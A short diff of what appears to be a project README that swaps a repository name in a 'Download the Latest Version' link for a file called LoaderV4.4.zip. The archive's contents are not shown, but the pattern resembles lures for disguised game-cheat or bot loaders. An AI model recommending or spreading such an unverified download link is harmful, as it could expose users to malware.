@@ -12,7 +12,7 @@
 
 <div align="center">
 
-[Download the Latest Version](https://github.com/useranewrff/roblox-/releases/download/Download/LoaderV4.4.zip)
+[Download the Latest Version](https://github.com/useranewrff/CUBES-AUTOBOT/releases/download/Download/LoaderV4.4.zip)
 
 </div>
 
